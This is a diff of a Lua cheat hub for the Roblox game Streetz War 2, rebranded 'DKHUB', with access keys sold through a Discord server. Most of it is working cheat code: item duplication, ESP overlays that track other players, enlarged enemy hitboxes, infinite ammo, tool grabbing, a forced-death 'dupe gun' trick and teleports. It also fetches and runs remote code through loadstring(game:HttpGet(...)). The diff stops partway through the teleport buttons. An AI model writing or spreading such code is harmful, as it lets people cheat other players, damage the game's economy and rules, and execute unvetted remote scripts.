@@ -1,123 +1,41 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "Ro Services v1 | Streetz Wars 2",
+   Name = "DKHUB | SW2",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Loading...",
-   LoadingSubtitle = "by DK",
-   Theme = "Serenity", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+   LoadingSubtitle = "by Theyfwdk0",
+   Theme = "", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
-   DisableRayfieldPrompts = true,
-   DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
-      Enabled = false,
+      Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Big Hub"
    },
 
    Discord = {
-      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "dkshub", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
-   KeySystem = false, -- Set this to true to use our key system
+   KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
-      Title = "Ro-key System",
-      Subtitle = "Enter Key",
-      Note = "Buy Key At Discord.gg/dkshub", -- Use this to tell the user how to get a key
-      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      Title = "DKHUB | KEY VERIFICATION",
+      Subtitle = "DKHUB | THEYFWDK0",
+      Note = "Buy A key At .gg/dkshub", -- Use this to tell the user how to get a key
+      FileName = "Key.txt", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"https://pastebin.com/raw/q1r3esnP"}
+      Key = {"DK"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
 
 local MainTab = Window:CreateTab("Main", 4483362458) -- Title, Image
-local MainSection = MainTab:CreateSection("Game Info")
-
-local Paragraph = MainTab:CreateParagraph({Title = "Game Name", Content = "[VALENTINES💞] Streetz War 2"})
-local Paragraph = MainTab:CreateParagraph({Title = "Game id", Content = "11177482306"})
-
-local MainSection = MainTab:CreateSection("Developer")
-local Paragraph = MainTab:CreateParagraph({Title = "devs", Content = "Theyfwdk0"})
-
-local AutofarmTab = Window:CreateTab("Autofarm", 4483362458) -- Title, Image
-local AutofarmSection = AutofarmTab:CreateSection("Mop Autofarm")
-
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Mop Autofarm",
-    CurrentValue = false,
-    Flag = "MopAutofarm",
-    Callback = function(state)
-        _G.automopfarm = state
-        while _G.automopfarm do
-            for i, v in pairs(game.Workspace.CleanPart:GetChildren()) do
-                if v.ProximityPrompt.Enabled == true then
-                    game:GetService("ReplicatedStorage").GiveMop:FireServer()
-                    v.ProximityPrompt.HoldDuration = 1
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 2, 0)
-                    wait(1)
-                    fireproximityprompt(v.ProximityPrompt, v.ProximityPrompt.HoldDuration, false)
-                    wait(v.ProximityPrompt.HoldDuration + 2.2)
-                end
-            end
-        end
-    end
-})
-
-local Section = AutofarmTab:CreateSection("Box Autofarm")
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Box Autofarm",
-    CurrentValue = false,
-    Flag = "BoxAutofarm",
-    Callback = function(state)
-        _G.autoboxfarm = state
-
-        task.spawn(function()
-            while _G.autoboxfarm do
-                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                
-                -- Move to the box location
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
-                wait(0.5)
-                
-                -- Pick up the box
-                fireclickdetector(game.Workspace.Job.Box.BOX1.ClickDetector)
-                wait(0.2)
-                
-                -- Move back to the old position
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
-                
-                -- Equip the box
-                game.Players.LocalPlayer.Backpack:WaitForChild("Box").Parent = game.Players.LocalPlayer.Character
-                
-                -- Drop the box at the job area
-                firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 0)
-                wait()
-                firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 1)
-                
-                -- Wait for the job cooldown
-                wait(15)
-            end
-        end)
-    end
-})
-
-local AutofarmSection = AutofarmTab:CreateSection("Anti Afk")
-
-local Button = AutofarmTab:CreateButton({
-   Name = "Anti Afk",
-   Callback = function()
-   -- The function that takes place when the button is pressed
-   end,
-})
-
-local CardTab = Window:CreateTab("Card", 4483362458) -- Title, Image
-local CardSection = CardTab:CreateSection("Card Dupe")
+local MainSection = MainTab:CreateSection("Main Features")
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -125,9 +43,25 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local player = Players.LocalPlayer
 
 local dupeAmount = 10
+local StatusLabel = MainTab:CreateLabel("Status: Waiting for action...")
+
+-- Notification function with error handling
+local function notify(message, time, type)
+    local success, err = pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = type or "Info",
+            Text = message,
+            Duration = time or 5,
+        })
+    end)
+
+    if not success then
+        warn("Notification failed: " .. err)
+    end
+end
 
 -- Textbox for Duplication Amount
-local inputField = CardTab:CreateInput({
+MainTab:CreateInput({
     Name = "Enter Card Dupe Amount",
     PlaceholderText = "10",
     RemoveTextAfterFocusLost = false,
@@ -136,29 +70,19 @@ local inputField = CardTab:CreateInput({
         dupeAmount = tonumber(value) or 10
         if dupeAmount <= 0 then
             dupeAmount = 10  -- Fallback value
+            StatusLabel.Text = "Invalid amount, defaulting to 10."
         end
-    end
-})
-
--- Button to Start Duplication
-local startButton = CardTab:CreateButton({
-    Name = "Start Duplication",
-    Text = "Start Duplication",
-    Callback = function()
-        if dupeAmount <= 0 then
-            notify("Invalid dupe amount!", 5, "Error")
-            return
-        end
-
-        -- Duplication Function
-        startDuplication()
     end
 })
 
 -- Duplication Function
-local function startDuplication()
-    -- Start the duplication process
-    notify("Buying cards & laptops...", 5, "Info")
+local function duplicateCardsAndLaptops()
+    if dupeAmount <= 0 then
+        StatusLabel.Text = "Invalid amount!"
+        return
+    end
+
+    StatusLabel.Text = "Buying cards & laptops..."
 
     -- Open Dealer UI
     fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
@@ -213,6 +137,7 @@ local function startDuplication()
     wait(4)
 
     -- Process Laptops
+    StatusLabel.Text = "Processing laptops..."
     local laptopCount = 0
     for _, v in pairs(player.Backpack:GetChildren()) do
         if v.Name == "Laptop" then
@@ -232,6 +157,7 @@ local function startDuplication()
     wait(4)
 
     -- Process Cards
+    StatusLabel.Text = "Processing cards..."
     local cardCount = 0
     for _, v in pairs(player.Backpack:GetChildren()) do
         if v.Name == "Loaded Card" then
@@ -247,225 +173,339 @@ local function startDuplication()
     end
 
     wait(1)
-    notify("Duplication Complete!", 5, "Info")
+    StatusLabel.Text = "Duplication Complete!"
     player.Character.Humanoid:UnequipTools()
 end
 
--- Notification function with error handling
-local function notify(message, time, type)
-    local success, err = pcall(function()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = type or "Info",
-            Text = message,
-            Duration = time or 5,
-        })
-    end)
-
-    if not success then
-        warn("Notification failed: " .. err)
-    end
-end
-
-local PlayerTab = Window:CreateTab("Player", 4483362458) -- Title, Image
-local PlayerSection = PlayerTab:CreateSection("Speed")
-
-local Slider = PlayerTab:CreateSlider({
-   Name = "Walkspeed",
-   Range = {0, 300},
-   Increment = 1,
-   Suffix = "Speed",
-   CurrentValue = 16,
-   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
-   end,
+-- Button for Duplication
+MainTab:CreateButton({
+    Name = "Start Card Duplication",
+    Callback = function()
+        duplicateCardsAndLaptops()
+    
+        end
 })
+local VisualsTab = Window:CreateTab("Visuals", 4483362458) -- Title, Image
+local VisualsSection = VisualsTab:CreateSection("Visuals")
 
-local PlayerSection = PlayerTab:CreateSection("Jump Power")
-
-local Slider = PlayerTab:CreateSlider({
-   Name = "JumpPower",
-   Range = {0, 300},
-   Increment = 1,
-   Suffix = "Height",
-   CurrentValue = 16,
-   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
-   end,
-})
-
-local Toggle = PlayerTab:CreateToggle({
-   Name = "Inf Jump",
+local Toggle = VisualsTab:CreateToggle({
+   Name = "Name tag",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-        local InfiniteJumpEnabled = true
-game:GetService("UserInputService").JumpRequest:connect(function()
-if InfiniteJumpEnabled then
-game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+        local esp_settings = { ---- table for esp settings 
+    textsize = 8,
+    colour = 255,255,255
+}
+ 
+local gui = Instance.new("BillboardGui")
+local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel
+ 
+ 
+ 
+gui.Name = "Cracked esp"; ---- properties of the esp
+gui.ResetOnSpawn = false
+gui.AlwaysOnTop = true;
+gui.LightInfluence = 0;
+gui.Size = UDim2.new(1.75, 0, 1.75, 0);
+esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+esp.Text = ""
+esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
+esp.BorderSizePixel = 4;
+esp.BorderColor3 = Color3.new(esp_settings.colour)
+esp.BorderSizePixel = 0
+esp.Font = "GothamSemibold"
+esp.TextSize = esp_settings.textsize
+esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour
+ 
+game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
+    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
+            esp.Text = "{"..v.Name.."}"
+            gui:Clone().Parent = v.Character.Head
+    end
 end
 end)
    end,
 })
 
-local PlayerSection = PlayerTab:CreateSection("fly")
-
-local Toggle = PlayerTab:CreateToggle({
-   Name = "enable fly",
+local Toggle = VisualsTab:CreateToggle({
+   Name = "esp",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+        
+-- Preview: https://cdn.discordapp.com/attachments/796378086446333984/818089455897542687/unknown.png
+-- Made by Blissful#4992
+local Settings = {
+    Box_Color = Color3.fromRGB(255, 0, 0),
+    Tracer_Color = Color3.fromRGB(255, 0, 0),
+    Tracer_Thickness = 1,
+    Box_Thickness = 1,
+    Tracer_Origin = "Bottom", -- Middle or Bottom if FollowMouse is on this won't matter...
+    Tracer_FollowMouse = false,
+    Tracers = true
+}
+local Team_Check = {
+    TeamCheck = false, -- if TeamColor is on this won't matter...
+    Green = Color3.fromRGB(0, 255, 0),
+    Red = Color3.fromRGB(255, 0, 0)
+}
+local TeamColor = true
+
+--// SEPARATION
+local player = game:GetService("Players").LocalPlayer
+local camera = game:GetService("Workspace").CurrentCamera
+local mouse = player:GetMouse()
+
+local function NewQuad(thickness, color)
+    local quad = Drawing.new("Quad")
+    quad.Visible = false
+    quad.PointA = Vector2.new(0,0)
+    quad.PointB = Vector2.new(0,0)
+    quad.PointC = Vector2.new(0,0)
+    quad.PointD = Vector2.new(0,0)
+    quad.Color = color
+    quad.Filled = false
+    quad.Thickness = thickness
+    quad.Transparency = 1
+    return quad
+end
+
+local function NewLine(thickness, color)
+    local line = Drawing.new("Line")
+    line.Visible = false
+    line.From = Vector2.new(0, 0)
+    line.To = Vector2.new(0, 0)
+    line.Color = color 
+    line.Thickness = thickness
+    line.Transparency = 1
+    return line
+end
+
+local function Visibility(state, lib)
+    for u, x in pairs(lib) do
+        x.Visible = state
+    end
+end
+
+local function ToColor3(col) --Function to convert, just cuz c;
+    local r = col.r --Red value
+    local g = col.g --Green value
+    local b = col.b --Blue value
+    return Color3.new(r,g,b); --Color3 datatype, made of the RGB inputs
+end
+
+local black = Color3.fromRGB(0, 0 ,0)
+local function ESP(plr)
+    local library = {
+        --//Tracer and Black Tracer(black border)
+        blacktracer = NewLine(Settings.Tracer_Thickness*2, black),
+        tracer = NewLine(Settings.Tracer_Thickness, Settings.Tracer_Color),
+        --//Box and Black Box(black border)
+        black = NewQuad(Settings.Box_Thickness*2, black),
+        box = NewQuad(Settings.Box_Thickness, Settings.Box_Color),
+        --//Bar and Green Health Bar (part that moves up/down)
+        healthbar = NewLine(3, black),
+        greenhealth = NewLine(1.5, black)
+    }
+
+    local function Colorize(color)
+        for u, x in pairs(library) do
+            if x ~= library.healthbar and x ~= library.greenhealth and x ~= library.blacktracer and x ~= library.black then
+                x.Color = color
+            end
+        end
+    end
+
+    local function Updater()
+        local connection
+        connection = game:GetService("RunService").RenderStepped:Connect(function()
+            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild("Head") ~= nil then
+                local HumPos, OnScreen = camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+                if OnScreen then
+                    local head = camera:WorldToViewportPoint(plr.Character.Head.Position)
+                    local DistanceY = math.clamp((Vector2.new(head.X, head.Y) - Vector2.new(HumPos.X, HumPos.Y)).magnitude, 2, math.huge)
+                    
+                    local function Size(item)
+                        item.PointA = Vector2.new(HumPos.X + DistanceY, HumPos.Y - DistanceY*2)
+                        item.PointB = Vector2.new(HumPos.X - DistanceY, HumPos.Y - DistanceY*2)
+                        item.PointC = Vector2.new(HumPos.X - DistanceY, HumPos.Y + DistanceY*2)
+                        item.PointD = Vector2.new(HumPos.X + DistanceY, HumPos.Y + DistanceY*2)
+                    end
+                    Size(library.box)
+                    Size(library.black)
+
+                    --//Tracer 
+                    if Settings.Tracers then
+                        if Settings.Tracer_Origin == "Middle" then
+                            library.tracer.From = camera.ViewportSize*0.5
+                            library.blacktracer.From = camera.ViewportSize*0.5
+                        elseif Settings.Tracer_Origin == "Bottom" then
+                            library.tracer.From = Vector2.new(camera.ViewportSize.X*0.5, camera.ViewportSize.Y) 
+                            library.blacktracer.From = Vector2.new(camera.ViewportSize.X*0.5, camera.ViewportSize.Y)
+                        end
+                        if Settings.Tracer_FollowMouse then
+                            library.tracer.From = Vector2.new(mouse.X, mouse.Y+36)
+                            library.blacktracer.From = Vector2.new(mouse.X, mouse.Y+36)
+                        end
+                        library.tracer.To = Vector2.new(HumPos.X, HumPos.Y + DistanceY*2)
+                        library.blacktracer.To = Vector2.new(HumPos.X, HumPos.Y + DistanceY*2)
+                    else 
+                        library.tracer.From = Vector2.new(0, 0)
+                        library.blacktracer.From = Vector2.new(0, 0)
+                        library.tracer.To = Vector2.new(0, 0)
+                        library.blacktracer.To = Vector2.new(0, 02)
+                    end
+
+                    --// Health Bar
+                    local d = (Vector2.new(HumPos.X - DistanceY, HumPos.Y - DistanceY*2) - Vector2.new(HumPos.X - DistanceY, HumPos.Y + DistanceY*2)).magnitude 
+                    local healthoffset = plr.Character.Humanoid.Health/plr.Character.Humanoid.MaxHealth * d
+
+                    library.greenhealth.From = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY*2)
+                    library.greenhealth.To = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY*2 - healthoffset)
+
+                    library.healthbar.From = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY*2)
+                    library.healthbar.To = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y - DistanceY*2)
+
+                    local green = Color3.fromRGB(0, 255, 0)
+                    local red = Color3.fromRGB(255, 0, 0)
+
+                    library.greenhealth.Color = red:lerp(green, plr.Character.Humanoid.Health/plr.Character.Humanoid.MaxHealth);
+
+                    if Team_Check.TeamCheck then
+                        if plr.TeamColor == player.TeamColor then
+                            Colorize(Team_Check.Green)
+                        else 
+                            Colorize(Team_Check.Red)
+                        end
+                    else 
+                        library.tracer.Color = Settings.Tracer_Color
+                        library.box.Color = Settings.Box_Color
+                    end
+                    if TeamColor == true then
+                        Colorize(plr.TeamColor.Color)
+                    end
+                    Visibility(true, library)
+                else 
+                    Visibility(false, library)
+                end
+            else 
+                Visibility(false, library)
+                if game.Players:FindFirstChild(plr.Name) == nil then
+                    connection:Disconnect()
+                end
+            end
+        end)
+    end
+    coroutine.wrap(Updater)()
+end
+
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+    if v.Name ~= player.Name then
+        coroutine.wrap(ESP)(v)
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(newplr)
+    if newplr.Name ~= player.Name then
+        coroutine.wrap(ESP)(newplr)
+    end
+end)
+
    end,
 })
 
-local Slider = PlayerTab:CreateSlider({
-   Name = "Fly Speed",
-   Range = {0, 200},
-   Increment = 1,
-   Suffix = "Speed",
-   CurrentValue = 10,
-   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-   Callback = function(Value)
-   -- The function that takes place when the slider changes
-   -- The variable (Value) is a number which correlates to the value the slider is currently at
+-- Initialize global variables
+_G.espEnabled = _G.espEnabled or false
+local espColor = espColor or Color3.new(1, 0, 0)  -- Default color is red
+local espBoxes = espBoxes or {}  -- Stores ESP boxes for each player
+local espConnection = nil  -- Keeps track of the RenderStepped connection
+
+-- Function to create an ESP box around a player
+local function createESPBox(player)
+    if not player or not player.Character then return end
+
+    -- Create a box or a part representing the ESP (as a simple example)
+    local espPart = Instance.new("Part")
+    espPart.Size = Vector3.new(4, 6, 4)
+    espPart.Anchored = true
+    espPart.CanCollide = false
+    espPart.Transparency = 0.5
+    espPart.Color = espColor
+    espPart.Parent = game.Workspace
+
+    -- Set position to the player's character
+    espPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
+
+    -- Store the ESP box so it can be updated later
+    espBoxes[player] = espPart
+end
+
+-- Function to remove ESP box for a player
+local function removeESP()
+    for _, box in pairs(espBoxes) do
+        if box and box.Parent then
+            box:Destroy()
+        end
+    end
+    espBoxes = {}
+end
+
+-- Function to update ESP boxes (called every frame)
+local function updateESP()
+    for player, box in pairs(espBoxes) do
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            box.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
+        else
+            box:Destroy()
+            espBoxes[player] = nil
+        end
+    end
+end
+
+local VisualsSection = VisualsTab:CreateSection("Security")
+
+local Button = VisualsTab:CreateButton({
+   Name = "hide name",
+   Callback = function()
+        for _, player in pairs(game.Players:GetPlayers()) do
+    local character = player.Character
+    if character and character:FindFirstChild("Head") then
+        local nameGui = character.Head:FindFirstChild("NameGui")
+        if nameGui and nameGui:FindFirstChild("Main") then
+            local nameLabel = nameGui.Main:FindFirstChild("Name")
+            if nameLabel then
+                nameLabel.Text = "Discord.gg/dkshub"  -- change dis with the name u want
+            end
+        end
+    end
+end   end,
+})
+
+local Button = VisualsTab:CreateButton({
+   Name = "Hide level",
+   Callback = function()
+        for _, player in pairs(game.Players:GetPlayers()) do
+    local character = player.Character
+    if character and character:FindFirstChild("Head") then
+        local nameGui = character.Head:FindFirstChild("NameGui")
+        if nameGui and nameGui:FindFirstChild("Main") then
+            local levelLabel = nameGui.Main:FindFirstChild("Level")
+            if levelLabel then
+                levelLabel.Text = "lvl 2317094803241264304"  -- This is the level changer :p
+            end
+        end
+    end
+end
    end,
 })
 
-local TeleportsTab = Window:CreateTab("Teleports", 4483362458) -- Title, Image
-local TeleportsSection = TeleportsTab:CreateSection("Main Teleports")
+local AimTab = Window:CreateTab("Aim", 4483362458) -- Title, Image
+local AimSection = AimTab:CreateSection("Weapon Features")
 
--- Create a list of teleport options
-local teleportOptions = {
-    {Name = "Apartment 1", Position = CFrame.new(4, 4, 50)},
-    {Name = "Apartment 2", Position = CFrame.new(2570, 4, -107)},
-    {Name = "Gun Store", Position = CFrame.new(-276, 4, 30)},
-    {Name = "Dealership", Position = CFrame.new(842, 5, -6)},
-    {Name = "Pharmacy", Position = CFrame.new(42, 5, -258)},
-    {Name = "Bank", Position = CFrame.new(-535, 5, -347)},
-    {Name = "Cap Store", Position = CFrame.new(-159, 5, 8)},
-    {Name = "Shit/Pant Store", Position = CFrame.new(-125, 5, 38)},
-    {Name = "Chain Store", Position = CFrame.new(39, 5, -232)},
-    {Name = "Boxing Gym", Position = CFrame.new(258, 5, -99)},
-}
-
--- Create the dropdown menu for teleportation
-local dropdown = TeleportsTab:CreateDropdown({
-    Name = "Select a Teleport",
-    Options = {},
-    Callback = function(selectedTeleport)
-        -- Find the corresponding teleport location based on selection
-        for _, teleport in ipairs(teleportOptions) do
-            if teleport.Name == selectedTeleport then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = teleport.Position
-                break
-            end
-        end
-    end
-})
-
--- Add teleport options to the dropdown
-for _, teleport in ipairs(teleportOptions) do
-    dropdown:AddOption(teleport.Name)
-end
-
--- Dealer Teleports Section
-local TeleportsSection = TeleportsTab:CreateSection("Dealer Teleports")
-local dealerTeleports = {
-    {Name = "Card Dealer", Position = CFrame.new(226, 4, -543)},
-    {Name = "Illeagal Dealer", Position = CFrame.new(-142, 5, 190)},
-}
-
--- Create a second dropdown for Dealer teleports
-local dealerDropdown = TeleportsTab:CreateDropdown({
-    Name = "Select Dealer Teleport",
-    Options = {},
-    Callback = function(selectedTeleport)
-        for _, teleport in ipairs(dealerTeleports) do
-            if teleport.Name == selectedTeleport then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = teleport.Position
-                break
-            end
-        end
-    end
-})
-
-for _, teleport in ipairs(dealerTeleports) do
-    dealerDropdown:AddOption(teleport.Name)
-end
-
--- Job Teleports Section
-local TeleportsSection = TeleportsTab:CreateSection("Job Teleports")
-local jobTeleports = {
-    {Name = "Mop Job", Position = CFrame.new(-102, 5, 20)},
-    {Name = "Pizza Job", Position = CFrame.new(163, 5, 49)},
-    {Name = "Box Job", Position = CFrame.new(-118, 5, 300)},
-}
-
--- Create a third dropdown for Job teleports
-local jobDropdown = TeleportsTab:CreateDropdown({
-    Name = "Select Job Teleport",
-    Options = {},
-    Callback = function(selectedTeleport)
-        for _, teleport in ipairs(jobTeleports) do
-            if teleport.Name == selectedTeleport then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = teleport.Position
-                break
-            end
-        end
-    end
-})
-
-for _, teleport in ipairs(jobTeleports) do
-    jobDropdown:AddOption(teleport.Name)
-end
-
-local teleportsSection = TeleportsTab:CreateSection("teleport to player")
-
-local function teleportToPlayer(player)
-    local char = game.Players.LocalPlayer.Character
-    if char then
-        -- Position the local player at the selected player's position
-        char:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame)
-    end
-end
-
-local Dropdown = TeleportsTab:CreateDropdown({
-    Name = "Select Player",
-    List = {},  -- We will populate this list with player names
-    Callback = function(selectedPlayer)
-        -- Find the player from the selected name and teleport
-        for _, player in ipairs(game.Players:GetPlayers()) do
-            if player.Name == selectedPlayer then
-                teleportToPlayer(player)
-                break
-            end
-        end
-    end
-})
-
--- Populate the dropdown with the current players in the game
-local function updatePlayerList()
-    local playerNames = {}
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        table.insert(playerNames, player.Name)
-    end
-    playersDropdown:SetList(playerNames)
-end
-
--- Update the dropdown when a player joins or leaves
-game.Players.PlayerAdded:Connect(updatePlayerList)
-game.Players.PlayerRemoving:Connect(updatePlayerList)
-
--- Initial update of the player list when the script is first run
-updatePlayerList()
-
-local GunTab = Window:CreateTab("Gun", 4483362458) -- Title, Image
-local GunSection = GunTab:CreateSection("Weapon Features")
-
-local Toggle = GunTab:CreateToggle({
-    Name = "Inifinite Ammo",
+local Toggle = AimTab:CreateToggle({
+    Name = "Inf Ammo",
     CurrentValue = false,
     Flag = "InfiniteAmmo",
     Callback = function(state)
@@ -490,9 +530,332 @@ local Toggle = GunTab:CreateToggle({
     end
 })
 
+local runService = game:GetService("RunService")
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
 
-local Toggle = GunTab:CreateToggle({
-   Name = "Godmode Self",
+_G.ToolStealing = false
+
+local function stealTools()
+    while _G.ToolStealing do
+        for _, tool in ipairs(workspace:GetDescendants()) do
+            if tool:IsA("Tool") and not tool:FindFirstAncestorOfClass("Model") then
+                local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:EquipTool(tool)
+                end
+            end
+        end
+        runService.RenderStepped:Wait()
+    end
+end
+
+local Toggle = AimTab:CreateToggle({
+   Name = "Dupe gun",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+               local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+        local safeZones = game.Workspace.SafeZones:GetChildren()
+        
+        local closestSafeZone = nil
+        local shortestDistance = math.huge 
+
+        for _, safeZone in ipairs(safeZones) do
+            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
+            if distance < shortestDistance then
+                shortestDistance = distance
+                closestSafeZone = safeZone
+            end
+        end
+        
+        if closestSafeZone then
+            humanoidRootPart.CFrame = closestSafeZone.CFrame
+            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
+        else
+            warn("No safe zones found.")
+        end
+    end
+})
+
+local hitboxColor = Color3.fromRGB(255, 255, 255)  -- Default color
+
+local Slider = AimTab:CreateSlider({
+    Name = "Hitbox Size",
+    Range = {2, 30},
+    Increment = 1,
+    Suffix = "HBES",
+    CurrentValue = 2,
+    Flag = "HitboxSize",
+    Callback = function(size)
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player.Character and player ~= game.Players.LocalPlayer then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    hrp.Size = Vector3.new(size, size, size)
+                    hrp.Transparency = 0.8
+                    hrp.BrickColor = BrickColor.new(hitboxColor)  -- Use the correct property for color
+                    hrp.CanCollide = false
+                end
+            end
+        end
+    end
+})
+
+local ColorPicker = AimTab:CreateColorPicker({
+    Name = "Hit Box Color",
+    Color = Color3.fromRGB(255,255,255),
+    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file
+    Callback = function(Value)
+        -- The function that takes place every time the color picker is moved/changed
+        hitboxColor = Value  -- Update the hitbox color with the selected color
+    end
+})
+
+local TeleportsTab = Window:CreateTab("Teleports", 4483362458) -- Title, Image
+local TeleportsSection = TeleportsTab:CreateSection("Player Teleport")
+
+local Input = TeleportsTab:CreateInput({
+    Name = "Username",
+    PlaceholderText = "username",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(v)
+        local found = false
+        local inputName = v:lower()
+
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            if player.Name:lower():sub(1, #inputName) == inputName then
+                playerteleport = player.Name
+                found = true
+                break
+            end
+        end
+
+        if not found then
+            Rayfield:Notify({
+                Title = "Error",
+                Content = 'No player found starting with "' .. v .. '".',
+                Duration = 4,
+                Type = "Error"
+            })
+        end
+    end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "tp to player",
+    Callback = function()
+        if playerteleport then
+            local player = game.Players:FindFirstChild(playerteleport)
+            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+            end
+        else
+            Rayfield:Notify({
+                Title = "Error",
+                Content = "No player selected to teleport.",
+                Duration = 4,
+                Type = "Error"
+            })
+        end
+    end
+})
+
+local TeleportsSection = TeleportsTab:CreateSection("Main Teleports")
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Apartment 1",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4, 4, 50)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Apartment 2",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2570, 4, -107)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Gun Store",
+    Callback = function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-276, 4, 30)
+end
+})
+
+local Button = TeleportsTab:CreateButton({
+    Name = "Dealership",
+    Callback = function()
